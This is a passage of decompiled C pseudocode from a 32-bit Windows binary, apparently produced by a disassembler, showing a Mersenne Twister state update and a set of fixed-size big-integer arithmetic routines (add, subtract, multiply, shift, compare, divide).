    result[227] = *result ^ ((*(result - 397) ^ (v3 ^ *(result - 397)) & 0x7FFFFFFFu) >> 1) ^ ((v3 & 1) != 0
                                                                                             ? 0x9908B0DF
                                                                                             : 0);
    v4 = *(result - 395);
    result[228] = ((v3 ^ (v3 ^ v4) & 0x7FFFFFFFu) >> 1) ^ result[1] ^ ((*(_BYTE *)(result - 395) & 1) != 0
                                                                     ? 0x9908B0DF
                                                                     : 0);
    v5 = *(result - 394);
    result[229] = ((v4 ^ (v4 ^ v5) & 0x7FFFFFFFu) >> 1) ^ result[2] ^ ((*(_BYTE *)(result - 394) & 1) != 0
                                                                     ? 0x9908B0DF
                                                                     : 0);
    v6 = *(result - 393);
    result[230] = ((v5 ^ (v5 ^ v6) & 0x7FFFFFFFu) >> 1) ^ result[3] ^ ((*(_BYTE *)(result - 393) & 1) != 0
                                                                     ? 0x9908B0DF
                                                                     : 0);
    v7 = *(result - 392) ^ (*(result - 392) ^ *(result - 391)) & 0x7FFFFFFF;
    result[231] = ((v6 ^ (v6 ^ *(result - 392)) & 0x7FFFFFFFu) >> 1) ^ result[4] ^ ((*(_BYTE *)(result - 392) & 1) != 0
                                                                                  ? 0x9908B0DF
                                                                                  : 0);
    result[232] = (v7 >> 1) ^ result[5] ^ ((v7 & 1) != 0 ? 0x9908B0DF : 0);
    result += 6;
    --v2;
  }
  while ( v2 );
  return result;
}

//----- (00402160) --------------------------------------------------------
int *__usercall sub_402160@<eax>(int a1@<eax>, int *a2@<edx>, unsigned __int8 *a3@<esi>)
{
  int v3; // ebx
  int v4; // eax
  int v5; // ecx
  int v6; // eax
  _DWORD *v7; // ecx
  int v8; // eax
  int v9; // eax
  int v10; // ecx
  int v11; // eax
  int v13; // [esp+8h] [ebp-4h]

  v3 = a1;
  memset(a2 + 1, 0, 0x320u);
  v4 = a1 >> 2;
  v5 = v3 & 3;
  *a2 = v3 >> 2;
  v13 = v5;
  if ( (v3 & 3) != 0 )
    *a2 = v4 + 1;
  if ( *a2 > 200 )
  {
    *a2 = 200;
    v3 = 800;
  }
  v6 = v3 - 1;
  if ( v3 - 1 >= 3 )
  {
    v7 = a2 + 1;
    do
    {
      *v7 = a3[v6] + ((a3[v6 - 1] + ((a3[v6 - 2] + (a3[v6 - 3] << 8)) << 8)) << 8);
      v6 -= 4;
      ++v7;
    }
    while ( v6 >= 3 );
    v5 = v13;
  }
  if ( v5 == 1 )
  {
    v8 = *a3;
  }
  else
  {
    if ( v5 == 2 )
    {
      v9 = *a3;
      v10 = a3[1];
    }
    else
    {
      if ( v5 != 3 )
        goto LABEL_17;
      v9 = a3[1] + (*a3 << 8);
      v10 = a3[2];
    }
    v8 = v10 + (v9 << 8);
  }
  a2[*a2] = v8;
LABEL_17:
  if ( *a2 > 1 )
  {
    do
    {
      if ( a2[*a2] )
        break;
      v11 = *a2 - 1;
      *a2 = v11;
    }
    while ( v11 > 1 );
  }
  return a2;
}

//----- (00402240) --------------------------------------------------------
char *__usercall sub_402240@<eax>(_DWORD *a1@<eax>, char *a2@<esi>, int *a3)
{
  int v4; // edx
  int v6; // ecx
  int v7; // eax
  unsigned int *v8; // edx
  __int64 v9; // kr08_8
  int v10; // eax
  __int64 v12; // [esp+8h] [ebp-10h]
  int i; // [esp+14h] [ebp-4h]
  int v14; // [esp+20h] [ebp+8h]

  v4 = *a1;
  memset(a2 + 4, 0, 0x320u);
  v6 = *a3;
  *(_DWORD *)a2 = 1;
  if ( v6 <= v4 )
    v6 = v4;
  *(_DWORD *)a2 = v6;
  v12 = 0i64;
  v14 = 0;
  if ( v6 > 0 )
  {
    v7 = (char *)a3 - (char *)a1;
    v8 = a1 + 1;
    for ( i = v7; ; v7 = i )
    {
      v9 = v12 + *v8 + (unsigned __int64)*(unsigned int *)((char *)v8 + v7);
      *(unsigned int *)((char *)v8++ + a2 - (char *)a1) = v9;
      v12 = SHIDWORD(v9);
      if ( ++v14 >= *(_DWORD *)a2 )
        break;
    }
    if ( HIDWORD(v9) && *(int *)a2 < 200 )
      *(_DWORD *)&a2[4 * (*(_DWORD *)a2)++ + 4] = HIDWORD(v9);
  }
  if ( *(int *)a2 > 1 )
  {
    do
    {
      if ( *(_DWORD *)&a2[4 * *(_DWORD *)a2] )
        break;
      v10 = *(_DWORD *)a2 - 1;
      *(_DWORD *)a2 = v10;
    }
    while ( v10 > 1 );
  }
  return a2;
}

//----- (00402300) --------------------------------------------------------
char *__usercall sub_402300@<eax>(_DWORD *a1@<eax>, char *a2@<edx>, int *a3)
{
  int v4; // esi
  int v6; // ecx
  int v7; // eax
  unsigned int *v8; // esi
  signed __int64 v9; // kr08_8
  int v10; // eax
  BOOL v12; // [esp+Ch] [ebp-10h]
  int i; // [esp+18h] [ebp-4h]
  int v14; // [esp+24h] [ebp+8h]

  v4 = *a1;
  memset(a2 + 4, 0, 0x320u);
  v6 = *a3;
  *(_DWORD *)a2 = 1;
  if ( v6 <= v4 )
    v6 = v4;
  *(_DWORD *)a2 = v6;
  v12 = 0;
  v14 = 0;
  if ( v6 <= 0 )
    goto LABEL_11;
  v7 = (char *)a3 - (char *)a1;
  v8 = a1 + 1;
  for ( i = v7; ; v7 = i )
  {
    v9 = *(unsigned int *)((char *)v8 + v7) - (unsigned __int64)*v8 - v12;
    *(unsigned int *)((char *)v8++ + a2 - (char *)a1) = v9;
    v12 = v9 < 0;
    if ( ++v14 >= *(_DWORD *)a2 )
      break;
  }
  if ( v9 >= 0 )
  {
LABEL_11:
    if ( *(int *)a2 <= 1 )
      return a2;
  }
  else
  {
    if ( *(int *)a2 < 200 )
      memset(&a2[4 * *(_DWORD *)a2 + 4], 0xFFu, 4 * (200 - *(_DWORD *)a2));
    *(_DWORD *)a2 = 200;
  }
  do
  {
    if ( *(_DWORD *)&a2[4 * *(_DWORD *)a2] )
      break;
    v10 = *(_DWORD *)a2 - 1;
    *(_DWORD *)a2 = v10;
  }
  while ( v10 > 1 );
  return a2;
}

//----- (004023E0) --------------------------------------------------------
char *__usercall sub_4023E0@<eax>(_DWORD *a1@<ecx>, char *a2@<ebx>, _DWORD *a3)
{
  int v3; // eax
  int v4; // ecx
  _DWORD *v5; // eax
  char v8[812]; // [esp+Ch] [ebp-330h] BYREF

  qmemcpy(a1, sub_402300(a3, v8, a1), 0x324u);
  *(_DWORD *)a2 = 0;
  memset(a2 + 4, 0, 0x320u);
  v3 = *a1;
  v4 = 0;
  *(_DWORD *)a2 = *a1;
  if ( v3 > 0 )
  {
    v5 = a2 + 4;
    do
    {
      *v5 = *(_DWORD *)((char *)v5 + (char *)a1 - a2);
      ++v4;
      ++v5;
    }
    while ( v4 < *(_DWORD *)a2 );
  }
  return a2;
}
// 4023E0: using guessed type char var_330[812];

//----- (00402460) --------------------------------------------------------
int *__usercall sub_402460@<eax>(int *a1@<ecx>, int *a2@<esi>)
{
  int v3; // edx
  int v4; // eax
  _DWORD *v5; // ecx
  int v7; // eax
  int *v8; // ecx
  int v9; // eax
  _DWORD *v10; // ecx
  int v11; // edx
  __int64 v12; // kr00_8
  int v13; // edx
  int v14; // eax
  _DWORD *v15; // ecx
  int v16; // [esp+8h] [ebp-330h]
  int v17[202]; // [esp+Ch] [ebp-32Ch] BYREF

  v3 = *a1;
  if ( *a1 != 1 || a1[1] )
  {
    v7 = 0;
    memset(v17, 0, 0x320u);
    v16 = v3;
    if ( v3 > 0 )
    {
      v8 = a1 + 1;
      do
        v17[v7++] = *v8++;
      while ( v7 < v16 );
    }
    v9 = 0;
    v10 = a1 + 1;
    do
      v17[v9++] = ~*v10++;
    while ( v9 < 200 );
    v11 = 0;
    do
    {
      if ( v11 >= 200 )
        break;
      v12 = (unsigned int)v17[v11] + 1i64;
      v17[v11++] = v12;
    }
    while ( HIDWORD(v12) );
    v13 = 200;
    v16 = 200;
    do
    {
      if ( v17[v13 - 1] )
        break;
      v16 = --v13;
    }
    while ( v13 > 1 );
    v14 = 0;
    memset(a2 + 1, 0, 0x320u);
    *a2 = v13;
    if ( v13 > 0 )
    {
      v15 = a2 + 1;
      do
        *v15++ = v17[v14++];
      while ( v14 < *a2 );
    }
    return a2;
  }
  else
  {
    v4 = 0;
    memset(v17, 0, 0x320u);
    memset(a2 + 1, 0, 0x320u);
    v16 = 1;
    *a2 = 1;
    v5 = a2 + 1;
    do
      *v5++ = v17[v4++];
    while ( v4 < *a2 );
    return a2;
  }
}
// 402460: using guessed type int var_32C[202];

//----- (004025C0) --------------------------------------------------------
int *__cdecl sub_4025C0(int *a1, int a2, int a3)
{
  int v3; // ebx
  int v4; // eax
  int v5; // ecx
  unsigned int v6; // ecx
  int v7; // edi
  int *v8; // esi
  unsigned __int64 v9; // rax
  int v10; // edx
  int v11; // eax
  _DWORD *v12; // ecx
  char v14; // cl
  int *v15; // esi
  int v16; // eax
  _DWORD *v17; // ecx
  int v18; // eax
  _DWORD *v19; // ecx
  unsigned int v20; // [esp+Ch] [ebp-350h]
  unsigned int v21; // [esp+18h] [ebp-344h]
  int *v22; // [esp+1Ch] [ebp-340h]
  int v23; // [esp+20h] [ebp-33Ch]
  char v24; // [esp+2Ah] [ebp-332h]
  char v25; // [esp+2Bh] [ebp-331h]
  int v26; // [esp+2Ch] [ebp-330h] BYREF
  int v27[202]; // [esp+30h] [ebp-32Ch] BYREF

  v25 = 0;
  v24 = 0;
  if ( (STACK[0x688] & 0x80000000) != 0 )
  {
    v25 = 1;
    qmemcpy(&a2, sub_402460(&a2, &v26), 0x324u);
  }
  if ( (STACK[0x9AC] & 0x80000000) != 0 )
  {
    v24 = 1;
    qmemcpy(&STACK[0x68C], sub_402460((int *)&STACK[0x68C], &v26), 0x324u);
  }
  v3 = STACK[0x68C];
  v4 = 0;
  memset(v27, 0, 0x320u);
  v5 = a2;
  v26 = 1;
  v23 = 0;
  if ( a2 > 0 )
  {
    v22 = &v27[v3];
    do
    {
      v6 = *(&a3 + v4);
      v7 = 0;
      v21 = v6;
      if ( v6 )
      {
        v20 = 0;
        if ( v3 > 0 )
        {
          v8 = &v27[v4];
          while ( 1 )
          {
            v3 = STACK[0x68C];
            v9 = v20 + (unsigned int)*v8 + *(&STACK[0x690] + v7) * (unsigned __int64)v6;
            *v8 = v9;
            ++v7;
            LODWORD(v9) = 0;
            ++v8;
            v20 = HIDWORD(v9);
            if ( v7 >= v3 )
              break;
            v6 = v21;
          }
          if ( v9 )
            *v22 = HIDWORD(v9);
          v4 = v23;
        }
      }
      v5 = a2;
      ++v22;
      v23 = ++v4;
    }
    while ( v4 < a2 );
  }
  v10 = v3 + v5;
  v26 = v3 + v5;
  if ( v3 + v5 > 200 )
  {
    v10 = 200;
    v26 = 200;
    do
    {
LABEL_19:
      if ( v27[v10 - 1] )
        break;
      v26 = --v10;
    }
    while ( v10 > 1 );
    goto LABEL_21;
  }
  if ( v10 > 1 )
    goto LABEL_19;
LABEL_21:
  if ( v27[199] >= 0 )
    goto LABEL_38;
  if ( v25 == v24 )
  {
LABEL_40:
    v15 = a1;
    v18 = 0;
    memset(a1 + 1, 0, 0x320u);
    *a1 = v10;
    if ( v10 > 0 )
    {
      v19 = a1 + 1;
      do
        *v19++ = v27[v18++];
      while ( v18 < *a1 );
    }
    return v15;
  }
  if ( v27[199] != 0x80000000 )
  {
LABEL_38:
    if ( v25 != v24 )
    {
      sub_402460(&v26, a1);
      return a1;
    }
    goto LABEL_40;
  }
  v11 = 0;
  if ( v10 == 1 )
  {
    memset(a1 + 1, 0, 0x320u);
    *a1 = 1;
    v12 = a1 + 1;
    do
      *v12++ = v27[v11++];
    while ( v11 < *a1 );
    return a1;
  }
  v14 = 1;
  if ( v10 - 1 > 0 )
  {
    while ( v14 )
    {
      if ( v27[v11] )
        v14 = 0;
      if ( ++v11 >= v10 - 1 )
      {
        if ( !v14 )
          goto LABEL_38;
        goto LABEL_34;
      }
    }
    goto LABEL_38;
  }
LABEL_34:
  v15 = a1;
  v16 = 0;
  memset(a1 + 1, 0, 0x320u);
  *a1 = v10;
  if ( v10 <= 0 )
    return v15;
  v17 = a1 + 1;
  do
    *v17++ = v27[v16++];
  while ( v16 < *a1 );
  return a1;
}

//----- (004028B0) --------------------------------------------------------
int *__usercall sub_4028B0@<eax>(int *a1@<ecx>, int *a2@<esi>, int a3)
{
  int v3; // edx
  int v4; // eax
  int *v5; // ebx
  int v6; // eax
  _DWORD *v7; // ecx
  int v9; // edx
  int v10; // eax
  _DWORD *v11; // ecx
  int v12; // [esp+Ch] [ebp-330h]
  int v13[202]; // [esp+10h] [ebp-32Ch] BYREF

  v3 = *a1;
  v4 = 0;
  memset(v13, 0, 0x320u);
  v12 = v3;
  if ( v3 > 0 )
  {
    v5 = a1 + 1;
    do
    {
      v13[v4] = *v5;
      v3 = v12;
      ++v4;
      ++v5;
    }
    while ( v4 < v12 );
  }
  if ( a3 )
  {
    v9 = sub_4029A0((int)v13, v3);
    v10 = 0;
    memset(a2 + 1, 0, 0x320u);
    *a2 = v9;
    if ( v9 > 0 )
    {
      v11 = a2 + 1;
      do
        *v11++ = v13[v10++];
      while ( v10 < *a2 );
    }
    return a2;
  }
  v6 = 0;
  memset(a2 + 1, 0, 0x320u);
  *a2 = v3;
  if ( v3 <= 0 )
    return a2;
  v7 = a2 + 1;
  do
    *v7++ = v13[v6++];
  while ( v6 < *a2 );
  return a2;
}
// 4028B0: using guessed type int var_32C[202];

//----- (004029A0) --------------------------------------------------------
int __cdecl sub_4029A0(int a1, int a2)
{
  int v2; // ecx
  int result; // eax
  _DWORD *v4; // edx
  int v5; // edi
  int v6; // esi
  unsigned __int64 v7; // rax
  int i; // [esp+Ch] [ebp-Ch]
  int v9; // [esp+10h] [ebp-8h]
  int v10; // [esp+14h] [ebp-4h]

  result = a2;
  v9 = 32;
  v10 = a2;
  if ( a2 > 1 )
  {
    v4 = (_DWORD *)(a1 + 4 * a2 - 4);
    do
    {
      if ( *v4 )
        break;
      --result;
      --v4;
    }
    while ( result > 1 );
    v10 = result;
  }
  for ( i = v2; v2 > 0; i = v2 )
  {
    if ( v2 < v9 )
      v9 = v2;
    v5 = 0;
    v6 = 0;
    if ( result > 0 )
    {
      do
      {
        v7 = (unsigned __int64)*(unsigned int *)(a1 + 4 * v6) << v9;
        *(_DWORD *)(a1 + 4 * v6++) = v5 | v7;
        v5 = HIDWORD(v7);
      }
      while ( v6 < v10 );
      if ( HIDWORD(v7) )
      {
        if ( v10 + 1 <= a2 )
          *(_DWORD *)(a1 + 4 * v10++) = HIDWORD(v7);
      }
      v2 = i;
      result = v10;
    }
    v2 -= v9;
  }
  return result;
}
// 4029D3: variable 'v2' is possibly undefined

//----- (00402A40) --------------------------------------------------------
int __cdecl sub_402A40(int a1, int a2)
{
  int v2; // ecx
  int result; // eax
  int v4; // esi
  _DWORD *v5; // edx
  int v6; // edi
  int v7; // esi
  unsigned __int64 v8; // rax
  _DWORD *v9; // ecx
  unsigned __int64 v10; // [esp+14h] [ebp-18h]
  int i; // [esp+20h] [ebp-Ch]
  char v12; // [esp+24h] [ebp-8h]
  int v13; // [esp+28h] [ebp-4h]

  result = a2;
  v4 = 32;
  v13 = 32;
  v12 = 0;
  if ( a2 > 1 )
  {
    v5 = (_DWORD *)(a1 + 4 * a2 - 4);
    do
    {
      if ( *v5 )
        break;
      --result;
      --v5;
    }
    while ( result > 1 );
    a2 = result;
  }
  for ( i = v2; v2 > 0; i = v2 )
  {
    if ( v2 < v4 )
    {
      v13 = v2;
      v12 = 32 - v2;
    }
    v6 = result - 1;
    LODWORD(v10) = 0;
    if ( result - 1 >= 0 )
    {
      do
      {
        v7 = v10 | ((unsigned __int64)*(unsigned int *)(a1 + 4 * v6) >> v13);
        v8 = (unsigned __int64)*(unsigned int *)(a1 + 4 * v6--) << v12;
        *(_DWORD *)(a1 + 4 * v6 + 4) = v7;
        v10 = v8;
      }
      while ( v6 >= 0 );
      result = a2;
      v2 = i;
    }
    v4 = v13;
    v2 -= v13;
  }
  if ( result > 1 )
  {
    v9 = (_DWORD *)(a1 + 4 * result - 4);
    do
    {
      if ( *v9 )
        break;
      --result;
      --v9;
    }
    while ( result > 1 );
  }
  return result;
}
// 402A75: variable 'v2' is possibly undefined

//----- (00402B10) --------------------------------------------------------
bool __usercall sub_402B10@<al>(char *a1@<edi>, char *a2@<esi>)
{
  int v3; // eax
  int v4; // eax
  char *i; // ecx

  if ( *((int *)a1 + 200) < 0 && (*((_DWORD *)a2 + 200) & 0x80000000) == 0 )
    return 0;
  if ( (*((_DWORD *)a1 + 200) & 0x80000000) == 0 && (*((_DWORD *)a2 + 200) & 0x80000000) != 0 )
    return 1;
  v3 = *(_DWORD *)a1;
  if ( *(_DWORD *)a1 <= *(_DWORD *)a2 )
    v3 = *(_DWORD *)a2;
  v4 = v3 - 1;
  if ( v4 < 0 )
    return 0;
  for ( i = &a2[4 * v4 + 4]; *(_DWORD *)&i[a1 - a2] == *(_DWORD *)i; i -= 4 )
  {
    if ( --v4 < 0 )
      return 0;
  }
  return *(_DWORD *)&a1[4 * v4 + 4] > *(_DWORD *)&a2[4 * v4 + 4];
}
// 402B63: conditional instruction was optimized away because eax.4>=0

//----- (00402B80) --------------------------------------------------------
bool __usercall sub_402B80@<al>(char *a1@<edi>, char *a2@<esi>)
{
  int v3; // eax
  int v4; // eax
  char *i; // ecx

  if ( *((int *)a1 + 200) < 0 && (*((_DWORD *)a2 + 200) & 0x80000000) == 0 )
    return 1;
  if ( (*((_DWORD *)a1 + 200) & 0x80000000) == 0 && (*((_DWORD *)a2 + 200) & 0x80000000) != 0 )
    return 0;
  v3 = *(_DWORD *)a1;
  if ( *(_DWORD *)a1 <= *(_DWORD *)a2 )
    v3 = *(_DWORD *)a2;
  v4 = v3 - 1;
  if ( v4 < 0 )
    return 0;
  for ( i = &a2[4 * v4 + 4]; *(_DWORD *)&i[a1 - a2] == *(_DWORD *)i; i -= 4 )
  {
    if ( --v4 < 0 )
      return 0;
  }
  return *(_DWORD *)&a1[4 * v4 + 4] < *(_DWORD *)&a2[4 * v4 + 4];
}
// 402BD3: conditional instruction was optimized away because eax.4>=0

//----- (00402BF0) --------------------------------------------------------
BOOL __usercall sub_402BF0@<eax>(char *a1@<eax>, char *a2)
{
  char *v2; // edi
  int v3; // edx
  int v5; // ecx
  _DWORD *i; // eax

  v2 = a2;
  v3 = *(_DWORD *)a2;
  if ( *(_DWORD *)a2 == *(_DWORD *)a1 )
  {
    v5 = 0;
    if ( v3 <= 0 )
      return 1;
    for ( i = a1 + 4; *(_DWORD *)((char *)i + a2 - a1) == *i; ++i )
    {
      if ( ++v5 >= v3 )
        return 1;
    }
    v2 = a2;
  }
  return sub_402B10(v2, a1);
}

//----- (00402C40) --------------------------------------------------------
void __cdecl sub_402C40(int a1, char a2)
{
  int *v2; // ecx
  int *v3; // eax
  void *v4; // ebx
  int v5; // edx
  int v6; // ecx
  unsigned int v7; // eax
  int v8; // ecx
  _DWORD *v9; // eax
  unsigned int v10; // edx
  signed int v11; // esi
  int v12; // ebx
  void *v13; // edi
  unsigned __int64 v14; // kr00_8
  unsigned int v15; // esi
  unsigned int v16; // ebx
  unsigned int v17; // eax
  int v18; // edx
  _DWORD *v19; // esi
  int v20; // eax
  _DWORD *v21; // ecx
  int v22; // ecx
  int v23; // eax
  int *v24; // ecx
  int v25; // ebx
  int v26; // esi
  int v27; // eax
  int *v28; // ecx
  int v29; // esi
  int v30; // edi
  int v31; // eax
  int v32; // eax
  unsigned int v33; // edx
  int v34; // edx
  int v35; // eax
  _DWORD *v36; // ecx
  int v37; // eax
  int v38; // eax
  int *v39; // edx
  int v40; // esi
  int v41; // eax
  _DWORD *v42; // ecx
  int v43; // eax
  _DWORD *v44; // esi
  int v45; // eax
  int *v46; // ecx
  int v47; // edx
  _DWORD *v48; // eax
  int v49; // [esp-648h] [ebp-1674h] BYREF
  int v50[200]; // [esp-644h] [ebp-1670h] BYREF
  _DWORD v51[205]; // [esp-324h] [ebp-1350h] BYREF
  unsigned int v52; // [esp+10h] [ebp-101Ch]
  unsigned int v53; // [esp+1Ch] [ebp-1010h]
  unsigned int v54; // [esp+20h] [ebp-100Ch]
  int *v55; // [esp+2Ch] [ebp-1000h]
  int *v56; // [esp+30h] [ebp-FFCh]
  int *v57; // [esp+34h] [ebp-FF8h]
  int v58; // [esp+38h] [ebp-FF4h]
  int v59; // [esp+3Ch] [ebp-FF0h]
  int v60; // [esp+40h] [ebp-FECh]
  int v61; // [esp+44h] [ebp-FE8h]
  void *v62; // [esp+48h] [ebp-FE4h]
  void *v63; // [esp+4Ch] [ebp-FE0h]
  int v64; // [esp+50h] [ebp-FDCh]
  _DWORD *v65; // [esp+54h] [ebp-FD8h]
  unsigned __int64 v66; // [esp+58h] [ebp-FD4h]
  char v67[808]; // [esp+60h] [ebp-FCCh] BYREF
  int v68[202]; // [esp+388h] [ebp-CA4h] BYREF
  int v69[200]; // [esp+6B0h] [ebp-97Ch] BYREF
  int v70; // [esp+9D0h] [ebp-65Ch]
  int v71; // [esp+9D8h] [ebp-654h] BYREF
  int v72[201]; // [esp+9DCh] [ebp-650h] BYREF
  int v73[201]; // [esp+D00h] [ebp-32Ch] BYREF

  v3 = (int *)STACK[0x167C];
  v57 = v2;
  v55 = v3;
  memset(v73, 0, 0x320u);
  v61 = a1 + 1;
  v4 = operator new[](4 * (a1 + 1));
  v62 = v4;
  if ( a1 + 1 > 0 )
    memset(v4, 0, 4 * (a1 + 1));
  v5 = *(&STACK[0x1358] + STACK[0x1358]);
  v6 = 0;
  v7 = 0x80000000;
  v60 = 0;
  do
  {
    if ( (v5 & v7) != 0 )
      break;
    ++v6;
    v7 >>= 1;
  }
  while ( v7 );
  v64 = v6;
  v8 = 0;
  if ( a1 > 0 )
  {
    v9 = v4;
    do
    {
      *v9 = *(_DWORD *)((char *)v9 + &a2 - (_BYTE *)v4);
      ++v8;
      ++v9;
    }
    while ( v8 < a1 );
  }
  sub_4029A0((int)v62, v61);
  qmemcpy(&STACK[0x1358], sub_4028B0((int *)&STACK[0x1358], v68, v64), 0x324u);
  v10 = *(&STACK[0x1354] + STACK[0x1358]);
  v11 = STACK[0x1358] + 1;
  v12 = v61 - STACK[0x1358];
  v54 = *(&STACK[0x1358] + STACK[0x1358]);
  v52 = v10;
  v58 = v12;
  v59 = v11;
  v13 = operator new[](4 * v11);
  v63 = v13;
  if ( v11 > 0 )
    memset(v13, 0, 4 * v11);
  if ( v12 > 0 )
  {
    v65 = (char *)v62 + 4 * v61 - 4;
    do
    {
      v14 = *(_QWORD *)(v65 - 1);
      *(_QWORD *)&v51[199] = v54;
      *(_QWORD *)&v51[197] = v14;
      v66 = v14 / v54;
      v53 = (v14 % v54) >> 32;
      v15 = v14 % v54;
      do
      {
        if ( v66 != 0x100000000i64 )
        {
          v16 = *(v65 - 2);
          *(_QWORD *)&v51[199] = v52;
          *(_QWORD *)&v51[197] = v66;
          if ( v66 * v52 <= __PAIR64__(v15, v16) )
            break;
        }
        --v66;
        v17 = (__PAIR64__(v53, v54) + v15) >> 32;
        v15 += v54;
        v53 = v17;
      }
      while ( !v17 );
      v18 = v59;
      v19 = v63;
      v20 = 0;
      if ( v59 > 0 )
      {
        v21 = v65;
        do
          v19[v20++] = *v21--;
        while ( v20 < v18 );
      }
      memset(v72, 0, 0x320u);
      v22 = v18;
      v71 = v18;
      if ( v18 > 200 )
      {
        v22 = 200;
        v71 = 200;
      }
      v23 = v22 - 1;
      if ( v22 - 1 >= 0 )
      {
        v24 = v72;
        do
          *v24++ = v19[v23--];
        while ( v23 >= 0 );
        v22 = v71;
      }
      for ( ; v22 > 1; v71 = --v22 )
      {
        if ( v72[v22 - 1] )
          break;
      }
      v26 = HIDWORD(v66);
      v25 = v66;
      memset(v51, 0, 804);
      v56 = v51;
      if ( !v66 )
        goto LABEL_33;
      do
      {
        if ( v51[0] >= 200 )
          break;
        v51[++v51[0]] = v25;
        v25 = v26;
        v26 = 0;
      }
      while ( v25 );
      if ( !v51[0] )
LABEL_33:
        v51[0] = 1;
      v49 = 0;
      memset(v50, 0, sizeof(v50));
      v49 = STACK[0x1358];
      v27 = 0;
      v56 = &v49;
      if ( (int)STACK[0x1358] > 0 )
      {
        v28 = v50;
        do
          *v28++ = *(&STACK[0x135C] + v27++);
        while ( v27 < v49 );
      }
      sub_4025C0(v69, v49, v50[0]);
      v29 = v72[199];
      v30 = v71;
      while ( v70 >= 0 || v29 < 0 )
      {
        if ( (v70 & 0x80000000) != 0 || v29 >= 0 )
        {
          v31 = v69[0];
          if ( v69[0] <= v30 )
            v31 = v30;
          v32 = v31 - 1;
          if ( v32 < 0 )
            break;
          while ( 1 )
          {
            v33 = v69[v32 + 1];
            if ( v33 != v72[v32] )
              break;
            if ( --v32 < 0 )
              goto LABEL_47;
          }
          if ( v33 <= v72[v32] )
            break;
        }
        --v66;
        sub_4023E0(v69, v67, &STACK[0x1358]);
      }
LABEL_47:
      sub_402300(v69, (char *)v68, &v71);
      v34 = v59;
      v35 = 0;
      if ( v59 > 0 )
      {
        v36 = v65;
        do
          *v36-- = v68[STACK[0x1358] - v35++ + 1];
        while ( v35 < v34 );
      }
      v37 = v60;
      --v65;
      v73[v60] = v66;
      v60 = v37 + 1;
      --v58;
    }
    while ( v58 > 0 );
  }
  v38 = v60;
  v39 = v55;
  *v55 = v60;
  v40 = 0;
  v41 = v38 - 1;
  if ( v41 < 0 )
    goto LABEL_55;
  v42 = v39 + 1;
  v40 = v41 + 1;
  do
    *v42++ = v73[v41--];
  while ( v41 >= 0 );
  if ( v40 < 200 )
LABEL_55:
    memset(&v39[v40 + 1], 0, 4 * (200 - v40));
  if ( *v39 > 1 )
  {
    do
    {
      if ( v39[*v39] )
        break;
      v43 = *v39 - 1;
      *v39 = v43;
    }
    while ( v43 > 1 );
  }
  if ( !*v39 )
    *v39 = 1;
  v44 = v62;
  v45 = sub_402A40((int)v62, v61);
  v46 = v57;
  v47 = 0;
  *v57 = v45;
  if ( v45 <= 0 )
    goto LABEL_65;
  v48 = v46 + 1;
  do
    *v48++ = v44[v47++];
  while ( v47 < *v46 );
  if ( v47 < 200 )
LABEL_65:
    memset(&v46[v47 + 1], 0, 4 * (200 - v47));
  if ( v44 )
    operator delete[](v44);
  if ( v63 )
    operator delete[](v63);
}
// 40318F: conditional instruction was optimized away because eax.4>=0
// 402C5E: variable 'v2' is possibly undefined
// 402C40: using guessed type int var_32C[201];
// 402C40: using guessed type char var_FCC[808];

//----- (004031E0) --------------------------------------------------------
int __fastcall sub_4031E0(int *a1, int *a2, int a3, int a4)
{
  int *v4; // ebx
  int v5; // ecx
  unsigned int v6; // esi
  int v7; // edi
  int v8; // edi
  int *v9; // esi
  unsigned __int64 v10; // rcx
  int result; // eax
  _DWORD *v12; // ecx
  int v13; // [esp+Ch] [ebp-340h]
  unsigned int v15; // [esp+14h] [ebp-338h]
  int v16; // [esp+20h] [ebp-32Ch]
  int v17[201]; // [esp+24h] [ebp-328h]

  v4 = a1;
  qmemcpy(a2 + 1, &a4, 0x320u);
  v16 = 0;
  v13 = 0;
  *a2 = a3;
  if ( a3 > 1 )
  {
    do
    {
      if ( a2[*a2] )
        break;
      v5 = *a2 - 1;
      *a2 = v5;
    }
    while ( v5 > 1 );
  }
  v6 = STACK[0x67C];
  v7 = *a2 - 1;
  v15 = a2[*a2];
  if ( v15 >= STACK[0x67C] )
  {
    v4 = a1;
    v17[0] = v15 / v6;
    v16 = 1;
    a2[v7 + 1] = v15 % v6;
  }
  v8 = v7 - 1;
  if ( v8 >= 0 )
  {
    v9 = &a2[v8 + 1];
    do
    {
      v10 = *(_QWORD *)v9 % (unsigned __int64)STACK[0x67C];
      v17[v16] = *(_QWORD *)v9 / (unsigned __int64)STACK[0x67C];
      *(_QWORD *)v9-- = (unsigned int)v10;
      --v8;
      ++v16;
    }
    while ( v8 >= 0 );
    v4 = a1;
  }
  *v4 = v16;
  result = v16 - 1;
  if ( v16 - 1 < 0 )
    goto LABEL_14;
  v12 = v4 + 1;
  v13 = v16;
  do
    *v12++ = v17[result--];
  while ( result >= 0 );
  if ( v16 < 200 )
  {
LABEL_14:
    result = 0;
    memset(&v4[v13 + 1], 0, 4 * (200 - v13));
  }
  if ( *v4 > 1 )
  {
    do
    {
      result = *v4;
      if ( v4[*v4] )
        break;
      *v4 = --result;
    }
    while ( result > 1 );
  }
  if ( !*v4 )
    *v4 = 1;
  if ( *a2 > 1 )
  {
    do
    {
      result = *a2;
      if ( a2[*a2] )
        break;
      *a2 = --result;
    }
    while ( result > 1 );
  }
  return result;
}
// 4031E0: using guessed type int var_328[201];

//----- (00403390) --------------------------------------------------------
int *__usercall sub_403390@<eax>(int *a1@<ebx>, int a2, int a3)
{
  bool v3; // zf
  int v4; // eax
  _DWORD *v5; // ecx
  int v7; // eax
  _DWORD *v8; // ecx
  int v9; // eax
  _DWORD *v10; // ecx
  int v11; // eax
  _DWORD *v12; // ecx
  int v13; // eax
  _DWORD *v14; // ecx
  int v15; // eax
  int v16; // ecx
  _DWORD *v17; // ecx
  int v18; // [esp-64Ch] [ebp-FDCh] BYREF
  _BYTE v19[804]; // [esp-648h] [ebp-FD8h] BYREF
  _DWORD v20[203]; // [esp-324h] [ebp-CB4h] BYREF
  int *v21; // [esp+8h] [ebp-988h]
  char v22; // [esp+Eh] [ebp-982h]
  char v23; // [esp+Fh] [ebp-981h]
  int v24[202]; // [esp+10h] [ebp-980h] BYREF
  int v25[202]; // [esp+338h] [ebp-658h] BYREF
  int v26; // [esp+660h] [ebp-330h] BYREF
  int v27[202]; // [esp+664h] [ebp-32Ch] BYREF

  v3 = (STACK[0xCB8] & 0x80000000) == 0;
  memset(v27, 0, 0x320u);
  memset(&v25[1], 0, 0x320u);
  v26 = 1;
  v25[0] = 1;
